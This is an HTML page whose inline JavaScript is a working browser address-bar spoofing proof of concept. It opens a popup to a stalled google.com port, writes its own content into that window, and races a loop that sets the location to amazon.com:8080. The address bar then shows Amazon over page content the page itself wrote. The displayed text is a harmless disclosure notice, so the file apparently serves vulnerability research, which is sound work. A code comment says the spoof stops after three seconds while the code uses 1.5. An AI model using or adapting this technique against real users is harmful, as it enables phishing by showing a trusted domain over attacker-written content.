<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <a href="javascript:window.open('https://www.amazon.com:8080/','x');" onclick="startSpoof()">Sppppppppoooooooooooof</a>
</body>
    
<script>
let windowSpoof;
let raceInterval;
let forceStopTimeout;

function race() {
  try {
    windowSpoof.location.href !== 'https://www.amazon.com:8080/','x';
  }
  catch (e) {
    windowSpoof.location.href='https://www.amazon.com:8080/','x';
  }
}

function stopSpoof() {
  if (raceInterval) {
    clearInterval(raceInterval);
    raceInterval = null;
  }
  if (forceStopTimeout) {
    clearTimeout(forceStopTimeout);
    forceStopTimeout = null;
  }
  console.log('Spoofing stopped');
}

function startSpoof() {
  windowSpoof = window.open("https://www.google.com:82","x");
  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
  
  raceInterval = setInterval(race, 0);
  
  // Force stop setelah 3 detik
  forceStopTimeout = setTimeout(stopSpoof, 1500);
}
</script>
